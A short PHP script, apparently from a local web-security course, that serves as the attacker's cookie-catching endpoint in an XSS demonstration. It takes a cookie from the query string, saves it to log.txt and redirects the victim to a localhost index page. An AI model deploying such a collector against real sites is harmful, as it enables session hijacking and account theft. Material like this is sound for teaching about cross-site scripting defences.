<?php

$cookie = $_GET['cookie'];

echo 'attacker is about to steal cookie...<br>';
file_put_contents('log.txt', $cookie);
echo 'attacker has stolen cookie and will redirect user to index...<br>';
header('Location: ' . 'http://localhost/_projetos/PHP_security/codecourse/codecourse-10-lessons/index.php'); //where user will be redirected after cookie being stolen
